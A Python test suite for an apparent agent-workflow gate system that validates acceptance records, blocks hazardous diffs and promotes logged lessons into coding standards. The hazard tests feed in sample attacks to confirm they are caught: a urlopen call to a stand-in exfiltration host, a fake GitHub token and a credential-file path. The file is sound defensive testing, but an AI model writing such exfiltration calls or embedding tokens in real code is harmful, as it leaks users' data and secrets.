"""三道门的测试。

这些测试就是“没有这次改动就会失败”的那种：把 assert 里的行为去掉，
它们会真的红。跑法：python -m unittest discover -s tests -t .
"""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from gates import acceptance_check as acc
from gates import hazard_check as hz
from gates import lessons_promote as lp
from gates import selfcheck as sc

FIXTURES = REPO_ROOT / "tests" / "fixtures"
LESSONS_FIXTURE = FIXTURES / "lessons_sample.md"


# --------------------------------------------------------------------------- 验收门


GOOD_TEXT = """fix: dashboard crash on empty list

Acceptance:
Source: x/@devon (v0.1.3336)
Cause: 空列表时取了 items[0]，越界。
Change: 先判空再取，补了一条空列表的测试。
Verified:
  - macos-15 arm64 | full suite | PASS
  - wsl ubuntu, /bin/sh=dash | test_hook | PASS
Red/Green:
  - revert old code: FAIL (IndexError)
  - apply new code: PASS
Not run:
  - 真实 NAS (没有设备)
"""


class AcceptanceTests(unittest.TestCase):
    def test_good_text_passes(self) -> None:
        record = acc.parse_text(GOOD_TEXT)
        problems, _ = acc.validate(record)
        self.assertEqual([], problems)

    def test_missing_not_run_is_rejected(self) -> None:
        text = GOOD_TEXT.split("Not run:")[0]
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("Not run" in p for p in problems), problems)

    def test_red_without_fail_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - revert old code: FAIL (IndexError)\n", "")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("FAIL" in p for p in problems), problems)

    def test_empty_not_run_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - 真实 NAS (没有设备)", "")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("Not run" in p for p in problems), problems)

    def test_none_not_run_passes(self) -> None:
        text = GOOD_TEXT.replace("  - 真实 NAS (没有设备)", "  - none")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertEqual([], problems)

    def test_generic_excuse_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("Cause: 空列表时取了 items[0]，越界。", "Cause: 修复了一些问题")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("空话" in p for p in problems), problems)

    def test_verified_missing_where_is_rejected(self) -> None:
        text = GOOD_TEXT.replace("  - macos-15 arm64 | full suite | PASS", "  - | full suite | PASS")
        problems, _ = acc.validate(acc.parse_text(text))
        self.assertTrue(any("在哪跑" in p for p in problems), problems)

    def test_loop_may_not_edit_own_rules(self) -> None:
        text = GOOD_TEXT + "\n"
        record = acc.parse_text(text)
        record["files"] = ["AGENTS.md"]
        problems, _ = acc.validate(record)
        self.assertTrue(any("受保护" in p for p in problems), problems)

    def test_json_fixture_passes(self) -> None:
        data = json.loads((FIXTURES / "acceptance_ok.json").read_text(encoding="utf-8"))
        problems, _ = acc.validate(data)
        self.assertEqual([], problems)

    def test_bad_fixture_fails(self) -> None:
        data = json.loads((FIXTURES / "acceptance_bad.json").read_text(encoding="utf-8"))
        problems, _ = acc.validate(data)
        self.assertTrue(len(problems) >= 3, problems)


# --------------------------------------------------------------------------- 危害门


def diff_for(path: str, *lines: str) -> str:
    body = "\n".join("+" + line for line in lines)
    return f"--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{len(lines)} @@\n{body}\n"


def findings_for(diff: str, files: list[str] | None = None) -> list[dict[str, str]]:
    rules = hz.load_rules()
    diff_files, changed = hz.parse_diff(diff)
    return hz.check(files or changed, diff_files, rules)


class HazardTests(unittest.TestCase):
    def test_ci_config_is_blocked(self) -> None:
        found = findings_for(diff_for(".github/workflows/ci.yml", "on: push"), [".github/workflows/ci.yml"])
        self.assertTrue(any(f["rule"] == "H1" for f in found), found)

    def test_release_script_is_blocked(self) -> None:
        found = findings_for("", ["scripts/release.sh"])
        self.assertTrue(any(f["kind"] == "ci_release" for f in found), found)

    def test_dependency_file_is_blocked(self) -> None:
        found = findings_for("", ["package.json"])
        self.assertTrue(any(f["kind"] == "dependency_change" for f in found), found)

    def test_new_external_url_is_blocked(self) -> None:
        found = findings_for(diff_for("app/net.py", 'urlopen("https://evil.example.com/collect")'))
        self.assertTrue(any(f["rule"] == "H2" for f in found), found)

    def test_known_host_is_allowed(self) -> None:
        found = findings_for(diff_for("app/net.py", 'urlopen("https://github.com/example/repo")'))
        self.assertFalse(any(f["rule"] == "H2" for f in found), found)

    def test_credential_leak_is_blocked(self) -> None:
        found = findings_for(diff_for("app/auth.py", 'TOKEN = "ghp_' + "a" * 36 + '"'))
        self.assertTrue(any(f["rule"] == "H4" for f in found), found)

    def test_credential_file_is_blocked(self) -> None:
        found = findings_for("", ["config/.env"])
        self.assertTrue(any(f["kind"] == "credential_access" for f in found), found)

    def test_promotion_link_is_blocked(self) -> None:
        found = findings_for(diff_for("docs/index.md", "[best relay](https://relay.example.com/?ref=abc)"))
        self.assertTrue(any(f["rule"] == "H6" for f in found), found)

    def test_promo_word_alone_is_not_blocked(self) -> None:
        """写文档解释这条规则时必然会提到这些词，不能因此把自己拦住。"""
        found = findings_for(diff_for("docs/rules.md", "危害门会拦推广链接、中转站和返利口令。"))
        self.assertFalse(any(f["rule"] == "H6" for f in found), found)

    def test_promo_word_with_link_is_blocked(self) -> None:
        found = findings_for(
            diff_for("docs/sponsors.md", "[加速节点](https://relay.example.com/x) 这是我们的返利入口")
        )
        self.assertTrue(any(f["rule"] == "H6" for f in found), found)

    def test_opaque_blob_is_blocked(self) -> None:
        blob = "A" * 40 + "8f3k2m9q7w1e5r6t0y4u2i3o8p7a6s5d" * 6
        found = findings_for(diff_for("app/payload.py", f'DATA = "{blob}"'))
        self.assertTrue(any(f["kind"] == "opaque_blob" for f in found), found)

    def test_plain_code_passes(self) -> None:
        found = findings_for(diff_for("app/logic.py", "def add(a, b):", "    return a + b"))
        self.assertEqual([], found)

    def test_blocklisted_author_is_blocked(self) -> None:
        rules = hz.load_rules()
        found = hz.check([], [], rules, author="bad-actor", blocklist={"github/bad-actor"})
        self.assertTrue(any(f["rule"] == "BLOCK" for f in found), found)


# --------------------------------------------------------------------------- 错题本


class LessonTests(unittest.TestCase):
    """错题本的解析与晋升。

    这几个用例读 tests/fixtures/lessons_sample.md，**不读活仓库的 LESSONS.md** ——
    活仓库那本会随 `python -m gates.lessons_promote --apply` 变化（够格的条目挪进
    docs/CODE_STANDARDS.md 后就从错题本里消失了），用例跟着它变就会在一次晋升后
    自己跑红：2026-11-19 第一次真跑 --apply 时，L-001 / L-002 一晋升，
    selfcheck 的 46 条单测当场挂掉 1 失败 + 2 错误。

    晋升本身改写文件，所以这里把 lp.LESSONS / lp.STANDARDS / lp.CI_RULES 全指到
    临时目录 —— 单测不许碰仓库里的真文件（见错题本 L-002）。
    """

    def setUp(self) -> None:
        tmp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(tmp_dir.cleanup)
        tmp = Path(tmp_dir.name)

        self.lessons_path = tmp / "LESSONS.md"
        self.standards_path = tmp / "CODE_STANDARDS.md"
        self.lessons_path.write_text(
            LESSONS_FIXTURE.read_text(encoding="utf-8"), encoding="utf-8"
        )
        self.standards_path.write_text(
            "head\n<!-- promoted-zone:start -->\n<!-- promoted-zone:end -->\ntail\n",
            encoding="utf-8",
        )

        saved = (lp.LESSONS, lp.STANDARDS, lp.CI_RULES)
        lp.LESSONS = self.lessons_path
        lp.STANDARDS = self.standards_path
        lp.CI_RULES = tmp / "ci_rules.json"

        def restore() -> None:
            lp.LESSONS, lp.STANDARDS, lp.CI_RULES = saved

        self.addCleanup(restore)

    def test_parses_all_lessons(self) -> None:
        _, lessons = lp.load_lessons(LESSONS_FIXTURE)
        self.assertEqual(["L-001", "L-002", "L-005"], [x.id for x in lessons])
        self.assertEqual("修之前先原样复现", lessons[0].title)

    def test_three_distinct_days_is_ready(self) -> None:
        _, lessons = lp.load_lessons(LESSONS_FIXTURE)
        by_id = {lesson.id: lesson for lesson in lessons}
        self.assertTrue(lp.ready(by_id["L-001"]))
        self.assertFalse(lp.ready(by_id["L-005"]))

    def test_machine_checkable_is_read(self) -> None:
        _, lessons = lp.load_lessons(LESSONS_FIXTURE)
        by_id = {lesson.id: lesson for lesson in lessons}
        self.assertTrue(by_id["L-002"].machine_checkable)
        self.assertFalse(by_id["L-001"].machine_checkable)

    def test_apply_dry_run_writes_nothing(self) -> None:
        lessons_before = self.lessons_path.read_text(encoding="utf-8")
        standards_before = self.standards_path.read_text(encoding="utf-8")
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-17", dry_run=True)
        self.assertEqual(lessons_before, self.lessons_path.read_text(encoding="utf-8"))
        self.assertEqual(standards_before, self.standards_path.read_text(encoding="utf-8"))

    def test_apply_promotes_ready_and_keeps_the_rest(self) -> None:
        """真晋升一次（不碰真仓库）：够格的进规范，剩下的留在错题本。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        moved = lp.cmd_apply(lessons, "2026-11-19")
        self.assertEqual(2, moved)

        standards = self.standards_path.read_text(encoding="utf-8")
        self.assertIn("<!-- promoted:L-001 -->", standards)
        self.assertIn("<!-- promoted:L-002 -->", standards)

        _, remaining = lp.load_lessons(self.lessons_path)
        self.assertEqual(["L-005"], [x.id for x in remaining])

    def test_apply_writes_ci_stub_only_for_machine_checkable(self) -> None:
        """L-002 标着 Machine-checkable: true → 落一条 CI 规则桩（enabled=false）。"""
        _, lessons = lp.load_lessons(self.lessons_path)
        lp.cmd_apply(lessons, "2026-11-19")
        rules = lp.load_ci_rules(self.lessons_path.parent / "ci_rules.json")["rules"]
        self.assertEqual(["L-002"], [r["id"] for r in rules])
        self.assertFalse(rules[0]["enabled"])

    def test_zone_insert_keeps_markers(self) -> None:
        text = "head\n<!-- promoted-zone:start -->\nold\n<!-- promoted-zone:end -->\ntail\n"
        out = lp.insert_into_zone(text, ["new-block\n"])
        self.assertIn("new-block", out)
        self.assertIn("old", out)
        self.assertLess(out.index("promoted-zone:start"), out.index("new-block"))
        self.assertLess(out.index("new-block"), out.index("promoted-zone:end"))


# --------------------------------------------------------------------------- CI 规则


class CiRuleTests(unittest.TestCase):
    """config/ci_rules.json 里启用的规则：真会查，而且查得准。

    夹具一律落在临时目录（错题本 L-002 本身的要求）：
    违规样本写进临时目录里的假仓库，模块全局 REPO_ROOT / CI_RULES 指过去，
    用完还原 —— 绝不碰仓库里的真文件。

    样本里的配置目录名单独放一行：拼样本时它与 home 引用不在同一行。
    否则本文件自己就在 L-002 的 scope 里，会把这条规则的测试自己拦下来。
    """

    CFG_DIR = ".claude"

    def setUp(self) -> None:
        tmp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(tmp_dir.cleanup)
        self.tmp = Path(tmp_dir.name)

        saved = (sc.REPO_ROOT, sc.CI_RULES)
        sc.REPO_ROOT = self.tmp
        sc.CI_RULES = self.tmp / "config" / "ci_rules.json"

        def restore() -> None:
            sc.REPO_ROOT, sc.CI_RULES = saved

        self.addCleanup(restore)

    def _use_real_repo(self) -> None:
        sc.REPO_ROOT = REPO_ROOT
        sc.CI_RULES = REPO_ROOT / "config" / "ci_rules.json"

    def _copy_real_rules(self) -> None:
        """把真规则表拷进临时仓库 —— 测的是真 pattern，不是抄一份改名的。"""
        (self.tmp / "config").mkdir(parents=True, exist_ok=True)
        src = REPO_ROOT / "config" / "ci_rules.json"
        (self.tmp / "config" / "ci_rules.json").write_text(
            src.read_text(encoding="utf-8"), encoding="utf-8"
        )

    def _rule(self) -> dict:
        data = json.loads((REPO_ROOT / "config" / "ci_rules.json").read_text(encoding="utf-8"))
        return next(r for r in data["rules"] if r["id"] == "L-002")

    def test_l002_rule_is_enabled_and_has_a_pattern(self) -> None:
        """L-002 不再是桩：enabled=true 且 pattern / scope 都填上了。"""
        rule = self._rule()
        self.assertTrue(rule["enabled"], rule)
        self.assertTrue(rule["pattern"], rule)
        self.assertTrue(rule["scope"], rule)

    def test_l002_reports_a_violation_in_a_temp_fixture(self) -> None:
        """规则被真正执行：临时假仓库里的违规写法必须被报出来。"""
        self._copy_real_rules()
        (self.tmp / "tests").mkdir(parents=True, exist_ok=True)
        bad_line = "cfg = Path.home() / " + '"' + self.CFG_DIR + '"' + "\n"
        (self.tmp / "tests" / "test_bad.py").write_text(bad_line, encoding="utf-8")

        violations, pending = sc.check_ci_rules()
        hits = [v for v in violations if v.startswith("L-002 ")]
        self.assertTrue(hits, violations)
        self.assertIn("tests/test_bad.py:1", hits[0])
        self.assertEqual([], [p for p in pending if p.startswith("L-002")])

    def test_l002_does_not_flag_temp_dir_paths(self) -> None:
        """临时目录里造一个同名配置目录不算违规 —— 别把自己人拦下来。"""
        self._copy_real_rules()
        (self.tmp / "tests").mkdir(parents=True, exist_ok=True)
        ok_line = "cfg = tmp_path / " + '"' + self.CFG_DIR + '"' + "\n"
        (self.tmp / "tests" / "test_ok.py").write_text(ok_line, encoding="utf-8")

        violations, _ = sc.check_ci_rules()
        self.assertEqual([], [v for v in violations if v.startswith("L-002 ")])

    def test_l002_is_clean_on_the_real_repo(self) -> None:
        """当前仓库必须干净：命中数 0，而且 L-002 不再被列成「还是桩」。"""
        self._use_real_repo()
        violations, pending = sc.check_ci_rules()
        self.assertEqual([], [v for v in violations if v.startswith("L-002 ")])
        self.assertEqual([], [p for p in pending if p.startswith("L-002")])


if __name__ == "__main__":
    unittest.main()
